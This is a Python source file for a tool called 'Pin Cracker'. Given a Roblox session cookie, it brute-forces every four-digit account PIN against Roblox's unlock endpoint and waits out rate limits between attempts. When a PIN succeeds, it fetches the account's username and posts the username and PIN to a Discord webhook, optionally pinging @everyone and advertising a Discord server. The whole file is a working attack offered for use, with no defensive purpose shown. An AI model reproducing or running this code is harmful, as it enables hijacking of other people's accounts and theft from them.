import requests
import time
import os
from colors import get_ansi_color

def get_os() -> str:
  if os.name == 'nt':
    return 'cls'
  return 'clear'

def start_cracker() -> None:
  cls_type = get_os()
  pingEveryone = True

  # Every CLI program needs an ASCII generated title, period.
  print(get_ansi_color(97, 249, 134, """
    ______ _         _____                _             
    | ___ (_)       /  __ \              | |            
    | |_/ /_ _ __   | /  \/_ __ __ _  ___| | _____ _ __ 
    |  __/| | '_ \  | |   | '__/ _` |/ __| |/ / _ \ '__|
    | |   | | | | | | \__/\ | | (_| | (__|   <  __/ |   
    \_|   |_|_| |_|  \____/_|  \__,_|\___|_|\_\___|_|           ♡
"""))
  
  cookie = input(get_ansi_color(246, 144, 250, 'Enter your cookie below:\n'))
  webhook = input(get_ansi_color(144, 219, 250, 'Enter your webhook below:\n'))
  pingEveryone = input(get_ansi_color(250, 245, 144, 'Should we ping Everyone?: ( y / n ): '))
  os.system(cls_type)
  if pingEveryone.lower() == 'y' or pingEveryone == 'yes':
    ping = '@everyone'
  else:
    ping = '***Pin Cracked! Join Our Discord : https://discord.gg/kunai***'
  print('*** Cracker Has Started. ***')

  
  url = 'https://auth.roblox.com/v1/account/pin/unlock'
  token = requests.post('https://auth.roblox.com/v1/login', cookies = {".ROBLOSECURITY": cookie})
  header = {'X-CSRF-TOKEN': token.headers['x-csrf-token']}


  for i in range(10000):
      try:
          pin = str(i).zfill(4)
          payload = {'pin': pin}
          r = requests.post(url, data = payload, headers = header, cookies = {".ROBLOSECURITY": cookie})
          if 'unlockedUntil' in r.text:
              print(f' ╚ Pin Cracked! Pin: {pin}')
              username = requests.get("https://users.roblox.com/v1/users/authenticated", cookies={".ROBLOSECURITY": cookie}).json()['name']
              data = {
                  "content": ping,
                  "username": "kunai;",
                  "avatar_url": "https://cdn.discordapp.com/attachments/930056703930671164/930057430270881812/Tanqr_gfx.png",
                  "embeds": [
                    {
                      "description": f"{username}\'s Pin:\n```{pin}```",
                      "title": "Cracked Pin!",
                      "color": 0x00ffff,
                    }
                  ]
              }
              requests.post(webhook, json = data)
              input('Press any key to exit')
              break
          elif 'Too many requests made' in r.text:
              print(get_ansi_color(247, 140, 48, ' ╚ Ratelimited, trying again in 60 seconds..'))
              time.sleep(60)
          elif 'Authorization' in r.text:
              print(get_ansi_color(247, 48, 48, ' ╚ Error! Is the cookie valid?'))
              break
          elif 'Incorrect' in r.text:
              print(get_ansi_color(247, 140, 48, f" ╚ Tried: {pin} , Incorrect!"))
              time.sleep(10)  
      except:
          print(get_ansi_color(247, 48, 48, ' ╚ Error!'))
  input('\nPress enter to exit')
  return

if __name__ == "__main__":
  start_cracker()
